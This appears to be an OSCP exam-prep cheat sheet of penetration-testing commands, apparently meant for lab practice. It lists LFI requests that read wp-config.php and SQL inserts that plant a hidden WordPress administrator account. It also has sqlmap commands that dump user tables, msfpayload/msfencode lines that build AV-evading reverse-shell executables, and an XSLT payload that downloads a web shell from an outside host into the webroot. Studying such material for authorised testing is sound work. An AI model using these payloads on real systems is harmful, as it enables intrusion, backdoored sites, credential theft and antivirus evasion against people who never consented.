## Information-Gathering-Vulnerability-Scanning

https://github.com/emre-uzun/oscp/blob/master/Information-Gathering-Vulnerability-Scanning/Useful-command.md

## Shell:

https://github.com/emre-uzun/oscp/blob/master/Shell/Generating-Reverse-Shell.md

***

## Exploitation

### LFI

oneExample:
GET /../../../../xampp\php\extras\browscap.ini
GET /../../../../xampp/htdocs/blog/wp-config.php


### DB

#### Connect MariaDB
mysql -u root 10.10.10.10 -p Password@1

SQL Query for Wordpress:
```
INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_user_level', '10');
```

#### SQLMAP
```
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dbs
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --tables -D cscart
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --columns -D cscart -T cscart_users
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dump -D cscart -T cscart_users
```



***

## PRIVILAGE ESCALATION


https://github.com/emre-uzun/oscp/tree/master/privilage-escalation



## ANTIVIRUS BYPASS

Normal exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 X > ~/Desktop/shell_reverse.exe
```

MSF Encoded Exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -o ~/Desktop/shell_reverse_msf_encoded.exe
```

MSF Encoded Embedded Exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -x /usr/share/windows-binaries/plink.exe -o ~/Desktop/shell_reverse_msf_encoded_embedded.exe
```

Custom Tool:

```
i586-mingw32msvc-gcc reverse.c -o ~/Desktop/custom-reverse.exe -lws2_32
```
### XXE
```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string xml()
{
    System.Net.WebClient webClient = new System.Net.WebClient();
    webClient.DownloadFile("https://x.x.x.x/shell.aspx",
                       @"c:\inetpub\wwwroot\shell.aspx");

    return "Exploit Success";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
```

## FLAG & CAPTURE

```
whoami
ipconfig/ifconfig
type C:\"Documents and Settings"\Administrator\Desktop\proof.txt
cat /root/proof.txt
id
dir C:\ /s/b | find /i “proof.txt”
cat `find / -name proof.txt -print`
